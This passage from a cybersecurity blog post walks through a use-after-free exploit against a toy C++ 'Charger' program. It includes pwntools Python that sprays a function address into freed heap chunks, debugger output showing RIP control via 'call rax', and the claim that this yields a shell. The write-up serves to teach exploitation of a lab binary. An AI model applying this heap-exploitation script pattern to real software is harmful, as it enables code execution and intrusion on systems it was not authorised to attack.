<span class="p">};</span>
</code></pre></div></div>

<p>You’ll notice that neither supertype has a method to safely handle or sanitize the description. Instead, as a public field, other functions can directly read and write that value. Only the supertype’s destructor plays any role in attempting to handle its destruction; but, as we will see in a bit, the behavior as defined is insufficient.</p>

<p>The <code class="language-plaintext highlighter-rouge">ChargeGun::description</code> is initialized in the <code class="language-plaintext highlighter-rouge">add_gun</code> function body:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void add_gun() {
    ...
    
    ChargeGun* ngun;
    ...
    
    if (dlen) {
        ngun-&gt;description = new char[dlen+1];
        printf("Enter description (manufacturer, ampacity, etc...): ");
        fgets(ngun-&gt;description, dlen+1, stdin);
        ...
    }
    ...
    charger.guns.push_back(ngun);
}
</code></pre></div></div>

<p>Additionally, we know that each charge plug’s destructor is invoked under two conditions: when the user explicitly removes it (option 2), or when the vector is destroyed in the Charger’s own destructor (bug). This gives us an opportunity to create a <code class="language-plaintext highlighter-rouge">ChargeGun</code>-sized buffer which is <em>free</em>‘d after the user exits <code class="language-plaintext highlighter-rouge">main</code>; if we can create a tcache of user-controlled data, we can try to invoke the address of <code class="language-plaintext highlighter-rouge">Charger::debug_mode</code> and get a shell.</p>

<p>To control the value of RAX, we can play with loops of creating, and corresponding loops of destroying, the <code class="language-plaintext highlighter-rouge">description</code> buffer. From analyzing the toy code earlier, we know that the vector’s internal size will equal the number of <code class="language-plaintext highlighter-rouge">push_back</code> calls multiplied by 8, the size of a 64-bit pointer. We can perform fuzzing exercises by creating different amounts of buffers, free-ing the first one (index <code class="language-plaintext highlighter-rouge">0</code>), and allowing the UAF condition to take the spotlight.</p>

<p>In this case, three is the magic number:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">create_iters</span> <span class="o">=</span> <span class="mi">3</span>
<span class="n">payload_size</span> <span class="o">=</span> <span class="n">create_iters</span> <span class="o">*</span> <span class="mi">8</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">payload_size</span>

<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">create_iters</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">payload_size</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"0"</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"6"</span><span class="p">)</span>
</code></pre></div></div>

<p>Our fuzz payload is at RAX.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Segmentation Fault
...

wdb&gt; x/i $pc
0x402074 &lt;Charger::on_port_disconnected+142&gt;:  call rax

wdb&gt; print $rax
$8 = 0x4141414141414141
</code></pre></div></div>

<p>Now, let’s modify the payload to send the address of <code class="language-plaintext highlighter-rouge">Chager::debug_mode</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wdb&gt; print Charger::debug_mode
$9 = 0x402248
</code></pre></div></div>

<p>We can spray this address on each iteration of the loop:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">create_iters</span> <span class="o">=</span> <span class="mi">3</span>
<span class="n">payload_size</span> <span class="o">=</span> <span class="n">create_iters</span> <span class="o">*</span> <span class="mi">8</span>
<span class="n">debug_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x402248</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="n">debug_addr</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">create_iters</span><span class="p">)])</span>

<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">create_iters</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">payload_size</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div></div>

<p>This gives us a shell.</p>

  </div><a class="u-url" href="/2025/09/01/analyzing-cplusplus-compiler-vulnerabilities.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">halcyondream</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">halcyondream</li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/halcyondream"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">halcyondream</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>Portfolio for Cybersecurity projects, research, and developments.</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
